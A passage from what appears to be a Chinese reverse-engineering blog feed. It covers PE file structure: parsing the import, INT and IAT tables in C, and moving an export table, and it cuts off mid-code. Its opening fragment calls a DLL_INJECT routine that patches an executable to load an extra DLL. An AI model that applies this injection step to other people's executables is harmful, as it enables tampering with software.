class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span>* buffer;<br>    <span class="hljs-type">char</span>* new_buffer;<br><br>    FILE* fp1 = <span class="hljs-literal">NULL</span>;<br>    FILE* fp2 = <span class="hljs-literal">NULL</span>;<br>    <br>    <span class="hljs-type">errno_t</span> err_1 = fopen_s(&amp;fp1, <span class="hljs-string">&quot;C:\\Users\\yongrin\\Desktop\\T.exe&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br>    <span class="hljs-type">errno_t</span> err_2 = fopen_s(&amp;fp2, <span class="hljs-string">&quot;C:\\Users\\yongrin\\Desktop\\Test_Test.exe&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>);<br><br>    DWORD size = Size(fp1);<br>    buffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(size);<br>    fread(buffer,size,<span class="hljs-number">1</span>,fp1);<br><br>    new_buffer = Section_add(fp1,buffer);<br>    DLL_INJECT(new_buffer);<br><br>    fwrite(new_buffer,size+ADD_SIZE,<span class="hljs-number">1</span>,fp2);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;   <br>&#125;<br><br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>PE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>PE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PE文件结构（十）</title>
    <link href="/2023/07/15/PE_9/"/>
    <url>/2023/07/15/PE_9/</url>
    
    <content type="html"><![CDATA[<p>IAT表、INT表、导入表</p><span id="more"></span><h2 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h2><p>导出表是告诉其他PE文件可以如何找到自己提供的函数，它分为名字导出、序号导出，又各自对应几张表，分别是函数地址表AddressOfFunctions、函数序号表AddressOfNameOrdinals、函数名称表AddressOfNames。</p><p>重定位表里面则是记录所有需要修改地址的地址，也就是告诉操作系统哪里有地址需要修改。当一个PE文件无法按照预计ImageBase装载时发挥作用</p><h2 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a>导入表</h2><p>一个PE文件有导出表，自然就有导入表。前者是告诉别人如何用，后者就相当于告诉别人自己要用什么。它可以通过OptionalHeader数据目录项的第二项找到</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307142243765.png"></p><p>同理这个VirtualAddress也是一个RVA，需要转化为FOA后才能在文件中找到真正的导入表结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        DWORD   Characteristics;            <br>        DWORD   OriginalFirstThunk; <span class="hljs-comment">// 指向 导入名称表INT（ImportNameTable）的RVA</span><br>    &#125; DUMMYUNIONNAME;<br>    DWORD   TimeDateStamp;                  <br>    DWORD   ForwarderChain;                 <br>    DWORD   Name;                   <span class="hljs-comment">// 指向 DLL名称的地址 RVA</span><br>    DWORD   FirstThunk;             <span class="hljs-comment">// 指向 导入地址表IAT（ImportAddressTable）的RVA</span><br>&#125; IMAGE_IMPORT_DESCRIPTOR;<br><span class="hljs-keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;<br></code></pre></td></tr></table></figure><p>其中<code>OrginalFirstThunk</code>和<code>FirstThunk</code>各自再指向两张表，分别是INT表和IAT表，<code>name</code>则是要用到的dll的名字。在进一步解析IAT表和INT表之前，先做个实验。</p><p>随便使用调试器打开一个PE文件，在里面找一找一些使用了系统调用的函数</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307142331070.png"></p><p>比如这里，实际上这条指令就是<code>mov rax ds:[4083b0]</code>，在内存中转去4083B0这个地址，看看是什么</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307142334814.png"></p><p>也就是说4083B0这个地址存放的是7FFFE86C3190，借助于调试器很方便的知道这个地址就是MessageBoxA的函数地址，这条指令也就等价于把MessageBoxa的地址给rax，然后再调用此函数。</p><p>而我们在文件中去看看4083B0这个地址存放的是什么呢（这里要减去ImageBase得到83B0，同时RVA转换FOA，才能在文件中找到，此地址在文件中对应的地址为37B0</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307142341414.png"></p><p>37B0这个地址存放的则是一个86F6，很显然与运行时存放的值不一样。继续深究86F6又是什么，首先这是一个RVA，将其转换为FOA后，得到3AF6</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307142344785.png"></p><p>当在文件中转去3AF6时，就会意料中地发现居然就是MessageBoxA这个函数名字，虽然前面还带了E9 01两字节不知道什么东西。</p><p>也就是说在内存中4083B0存放的是MessageBoxA的地址，而文件中则对应存放的是MessageBoxA的名字的RVA。换句话说存放的东西不一样，但两者之间肯定有一定的联系。实际上，3AF6处就是IAT表中的一项。</p><p>目前可以明确的是IAT表运行前运行后确实会发生变化，这其实就跟PE文件加载过程有关了。</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307142354979.png"></p><p>在PE文件加载之前，INT表和IAT表指向同一块地方，换句话说INT表和IAT表在运行前是完全一样的但是独立的两张表，在多数情况下它们处于不同的地址处，但是存放相同的值。在PE文件加载之后，操作系统就会根据INT表去找那些函数地址，比如MesaageBoxA的地址，然后填入IAT表中。</p><p>这里不妨细说一下exe文件加载过程</p><ul><li>首先操作系统给exe文件分配4GB的虚拟空间，然后把exe本身的代码加载到ImageBase处，通常来说exe是首先加载的，往往都能预计加载到ImageBase处，因此不需要使用重定位表修改。</li><li>其次，操作系统往4GB空间中加载各种DLL文件，由于DLL文件往往会有冲突，不能按照预计ImageBase装载，因此需要使用DLL本身提供的重定位表修复自己的地址</li><li>待所有DLL都加载并修复完后，操作系统根据exe的INT表去找函数地址，找到一个地址就填入IAT表中，遍历完INT表也就遍历完IAT表，由此完成对IAT表的修改（这个找函数地址的过程，其实就是调用GetPrcoAddress这个函数，我们在此之前实现了差不多的）</li><li>此时INT表存储了函数名称或者序号，IAT表存储了对应的函数地址，想要使用DLL一个函数也就简单了。</li></ul><p>也就是说文件加载前后INT表不变，文件加载前IAT表和INT表相同，文件加载后IAT表发生变化</p><p>那么INT表是如何存储函数名称或者序号呢？</p><p>先来看看INT表表项结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_THUNK_DATA32</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        PBYTE  ForwarderString;<br>        PDWORD Function;<br>        DWORD Ordinal; <span class="hljs-comment">//序号</span><br>        PIMAGE_IMPORT_BY_NAME  AddressOfData;<span class="hljs-comment">//指向IMAGE_IMPORT_BY_NAME</span><br>    &#125; u1;<br>&#125; IMAGE_THUNK_DATA32;<br></code></pre></td></tr></table></figure><p>注意这是个联合体，也就是说这个结构宽度是4个字节，虽然看起来这个联合体存放了很多东西。但又最简单的方法判断，如果这4个字节最高位是1，那么剩下31位就代表函数序号；如果最高位不为1，那么剩下31为就代表一个RVA指向另一个结构<code>IMAGE_IMPORT_BY_NAME</code>，即<code>if(INT &amp; 0x80000000 == 0x80000000) :序号导出 else RVA = IMAGE_IMPORT_BY_NAME</code></p><p>这个IMAGE_IMPORT_BY_NAME结构也简单</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_IMPORT_BY_NAME</span> &#123;</span><br>    WORD    Hint;<span class="hljs-comment">//可能为空，编译器决定 如果不为空 是函数在导出表中的索引</span><br>    BYTE    Name[<span class="hljs-number">1</span>];    <span class="hljs-comment">//函数名称，以0结尾</span><br>&#125; IMAGE_IMPORT_BY_NAME<br></code></pre></td></tr></table></figure><p>第二个成员就指向名字的第一个字节。</p><p>IAT表和INT表在加载前是完全一样的，其结构也是一样的，它们的成员都会指向相同的序号或者IMAGE_IMPORT_BY_NAME结构</p><h2 id="代码遍历"><a href="#代码遍历" class="headerlink" title="代码遍历"></a>代码遍历</h2><p>NOTE：我使用的PE文件是64位的，在处理上会略有所不同。会在代码中标出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">Size</span><span class="hljs-params">(FILE* fp)</span>&#123;<br>    <span class="hljs-type">int</span> size = <span class="hljs-number">0</span>;<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_END);<br>    size = ftell(fp);<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_SET);<br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br><br><br>DWORD <span class="hljs-title function_">RVA_TO_FOA</span><span class="hljs-params">(DWORD RVA,<span class="hljs-type">char</span>* Buffer)</span>&#123;<br>   PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_FILE_HEADER FileHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_OPTIONAL_HEADER OptionalHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>    FileHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>OptionalHeader = (PIMAGE_OPTIONAL_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader);<br>    <br>    <span class="hljs-keyword">if</span> (RVA &lt; OptionalHeader-&gt;SizeOfHeaders)<br>&#123;<br><span class="hljs-keyword">return</span> RVA;<br>&#125;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;FileHeader-&gt;NumberOfSections<span class="hljs-number">-1</span>;i++)&#123;<br>        <span class="hljs-keyword">if</span>(RVA &gt;= SectionHeader-&gt;VirtualAddress &amp;&amp; RVA &lt; (SectionHeader+<span class="hljs-number">1</span>)-&gt;VirtualAddress)&#123;<br>            DWORD offset = RVA - SectionHeader-&gt;VirtualAddress;<br>            <span class="hljs-keyword">return</span> SectionHeader-&gt;PointerToRawData + offset;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            SectionHeader +=<span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br><br>     <span class="hljs-comment">//最后一个节区</span><br>    DWORD offset = RVA - SectionHeader-&gt;VirtualAddress;<br>    <span class="hljs-keyword">return</span> SectionHeader-&gt;PointerToRawData + offset;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Import_INFO</span><span class="hljs-params">(<span class="hljs-type">char</span>* Buffer)</span>&#123;<br>    PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_FILE_HEADER FILEHeader = <span class="hljs-literal">NULL</span>;<br>     <span class="hljs-comment">//如果是查看32位的PE文件 这里改为PIMAGE_OPTIONAL_HEADER6432</span><br>PIMAGE_OPTIONAL_HEADER64 OptionalHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br><br>DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>FILEHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>                     <span class="hljs-comment">//如果是查看32位的PE文件 这里改为PIMAGE_OPTIONAL_HEADER6432</span><br>OptionalHeader = (PIMAGE_OPTIONAL_HEADER64)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FILEHeader-&gt;SizeOfOptionalHeader);<br><br>PIMAGE_IMPORT_BY_NAME ImportByName=<span class="hljs-literal">NULL</span>;<br>PIMAGE_IMPORT_DESCRIPTOR Import_Table = (PIMAGE_IMPORT_DESCRIPTOR)(Buffer + RVA_TO_FOA(OptionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress,Buffer));<br><span class="hljs-comment">//用于确定导入表的结束</span><br><span class="hljs-type">char</span> ZERO[<span class="hljs-keyword">sizeof</span>(IMAGE_IMPORT_DESCRIPTOR)] = &#123; <span class="hljs-number">0</span> &#125;;<br><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; <span class="hljs-built_in">memcmp</span>(ZERO,Import_Table,<span class="hljs-keyword">sizeof</span>(IMAGE_IMPORT_DESCRIPTOR));i++)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;----------第 %d 个导入表----------\n&quot;</span>,i);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Time Date Stamp:%X\n&quot;</span>,Import_Table-&gt;TimeDateStamp);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Dll name:%s\n&quot;</span>,(Buffer + RVA_TO_FOA(Import_Table-&gt;Name,Buffer)));<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;INT RVA:%X\n&quot;</span>,Import_Table-&gt;OriginalFirstThunk);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;IAT RVA:%X\n&quot;</span>,Import_Table-&gt;FirstThunk);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;******INT TABLE******\n&quot;</span>);<br>         <span class="hljs-comment">//如果是查看32位的PE文件 这里改为DWORD*</span><br><span class="hljs-type">long</span> <span class="hljs-type">long</span>* INT_Address = (<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)(Buffer + RVA_TO_FOA(Import_Table-&gt;OriginalFirstThunk,Buffer));<br><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; *INT_Address ;j++)&#123;<br><span class="hljs-comment">//最高位是1 则是序号导出 ////如果是查看32位的PE文件 这里改为0x80000000</span><br><span class="hljs-keyword">if</span>(((*INT_Address) &amp; <span class="hljs-number">0x8000000000000000</span>))&#123;         <span class="hljs-comment">// 这里改为0x7fffffff   </span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;第%d个函数序号为:%d\n&quot;</span>,j,(*INT_Address) &amp; <span class="hljs-number">0x7fffffffffffffff</span>);<br>&#125;<br><span class="hljs-comment">//否则是偏移指向另一个结构</span><br><span class="hljs-keyword">else</span>&#123;<br>ImportByName = (PIMAGE_IMPORT_BY_NAME)(Buffer + RVA_TO_FOA(*(INT_Address),Buffer));<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;第%d个函数名字为:%s\n&quot;</span>,j,ImportByName-&gt;Name);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;INT_ADDRESS:%X \n&quot;</span>,*INT_Address);<br>&#125;<br><br>INT_Address++;<br>&#125;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;******IAT TABLE******\n&quot;</span>);<br>        <span class="hljs-comment">//如果是查看32位的PE文件 这里改为DWORD*</span><br><span class="hljs-type">long</span> <span class="hljs-type">long</span>* IAT_Address = (<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)(Buffer + RVA_TO_FOA(Import_Table-&gt;FirstThunk,Buffer));<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; *IAT_Address ;j++)&#123;<br><span class="hljs-comment">//最高位是1 则是序号导出 这里改为0x80000000</span><br><span class="hljs-keyword">if</span>((*IAT_Address) &amp; <span class="hljs-number">0x8000000000000000</span>)&#123;           <span class="hljs-comment">// 这里改为0x7fffffff  </span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;第%d个函数序号为:%d\n&quot;</span>,j,(*IAT_Address) &amp; <span class="hljs-number">0x7fffffffffffffff</span>);<br>&#125;<br><span class="hljs-comment">//否则是偏移指向另一个结构</span><br><span class="hljs-keyword">else</span>&#123;<br>ImportByName = (PIMAGE_IMPORT_BY_NAME)(Buffer + RVA_TO_FOA(*IAT_Address,Buffer));<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;第%d个函数名字为:%s\n&quot;</span>,j,ImportByName-&gt;Name);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;IAT_ADDRESS:%X \n&quot;</span>,*IAT_Address);<br>&#125;<br>IAT_Address++;<br>&#125;<br><br>Import_Table++;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------------------\n&quot;</span>);<br>&#125;<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span>* buffer;<br>    <span class="hljs-type">char</span>* new_buffer;<br><br>    FILE* fp1 = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">errno_t</span> err_1 = fopen_s(&amp;fp1, <span class="hljs-string">&quot;C:\\Users\\yongrin\\Desktop\\Func.dll&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br><br>    <span class="hljs-comment">//将文件读取到程序中</span><br>    <span class="hljs-type">int</span> size = Size(fp1);<br>    buffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(size);<br>    fread(buffer,size,<span class="hljs-number">1</span>,fp1);<br><br>Import_INFO(buffer);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>PE加载前，INT表和IAT表存放了相同的值指向同一处地方，或为函数序号、或为函数名称。</p><p>PE加载后，操作系统根据INT表找到各个DLL中每个函数的具体地址，将其填入IAT中。</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307142354979.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>PE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>PE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PE文件结构（九）</title>
    <link href="/2023/07/12/PE_8/"/>
    <url>/2023/07/12/PE_8/</url>
    
    <content type="html"><![CDATA[<p>PE文件练习</p><p>移动导出表、重定位表、手动修复重定位表</p><span id="more"></span><h2 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h2><p>导出表是告诉其他PE文件本身可以提供什么函数，并且提供名字索引和序号索引两种方式找到一个函数地址。导出表下又指向了三张新表，分别是函数地址表，序号表，名称表。</p><p>重定位表是在PE文件无法按照预计ImageBase装载时，提供所有需要修改地址的一张表。因为编译器在编译文件时会按照预计ImageBase计算所有地址，以硬编码方式生成，那么在ImageBase无法正确装载时，这些硬编码地址就需要更改，重定位表就负责提供这些硬编码地址。</p><p>现在就尝试去移动这两张表，并根据重定位表原理手动修复一下。</p><h2 id="移动导出表"><a href="#移动导出表" class="headerlink" title="移动导出表"></a>移动导出表</h2><p>先来看看导出表的结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span><br>        DWORD   Characteristics;<span class="hljs-comment">//没用</span><br>        DWORD   TimeDateStamp;<span class="hljs-comment">//时间戳</span><br>        WORD    MajorVersion;<span class="hljs-comment">//没用</span><br>        WORD    MinorVersion;<span class="hljs-comment">//没用</span><br>        DWORD   Name;<span class="hljs-comment">//指向导出表文件名 RVA --&gt;FOA+FileBuff=char *name;</span><br>        DWORD   Base;<span class="hljs-comment">//导出函数起始序号</span><br>        DWORD   NumberOfFunctions;<span class="hljs-comment">//导出函数个数</span><br>        DWORD   NumberOfNames;<span class="hljs-comment">//以名称导出函数个数</span><br>        DWORD   AddressOfFunctions;<span class="hljs-comment">//导出函数地址表 RVA--&gt;FOA +FileBuff         </span><br>DWORD   AddressOfNames;    <span class="hljs-comment">//导出函数名称表     // RVA from base of image</span><br>        DWORD   AddressOfNameOrdinals; <span class="hljs-comment">//导出函数序号表 // RVA from base of image</span><br>&#125; IMAGE_EXPORT_DIRECTORY, * PIMAGE_EXPORT_DIRECTORY;<br></code></pre></td></tr></table></figure><p>其中 AddressOfFunctions、AddressOfNames、AddressOfNameOrdinals对应三张表的地址。</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307072016159.png"></p><p>我们目标就是把这三张表移动一个新的节区，再把导出表结构放到这三张表后面。</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307120055868.png"></p><p>可以分为以下几个步骤来移动</p><blockquote><p>1.创建一个新的节区</p><p>2.将函数地址表，即AddressOfFunctions对应的表移到新节区开头，并将原AddressOfFunctions进行修正</p><p>3.将函数序号表，即AddressOfNameOrdinals对应的表接续移到新节区，并将原AddressOfNameOrdinals进行修正</p><p>4.将函数名称表，即AddressOfNames对应的表接续移到新节区，并将原AddressOfNames进行修正</p><p>5.将函数名称表对应的所有名字接续移到新节区，并把函数名称表里地址进行修正</p><p>6.将整个导出表接续移到新节区，并把原来的Directory目录项进行修正</p></blockquote><p>NOTE：</p><p>1.需要主要各种地址之间的转化，是RVA还是FOA</p><p>2.需要主要各种指针类型之间的转化，这在指针运算中十分重要</p><p>3.可以尝试使用新移动后的dll，验证是否成功移动</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>代码中会有详细注释，仅给出移动导出表函数实现，其余函数已在其余文章中有实现，不再重复给出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-type">char</span>* <span class="hljs-title function_">Move_ExportTable</span><span class="hljs-params">(<span class="hljs-type">char</span>* Buffer)</span>&#123;<br>    PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_FILE_HEADER FILEHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_OPTIONAL_HEADER64 OptionalHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER New_SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>FILEHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>OptionalHeader = (PIMAGE_OPTIONAL_HEADER64)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FILEHeader-&gt;SizeOfOptionalHeader);<br>New_SectionHeader=(PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER 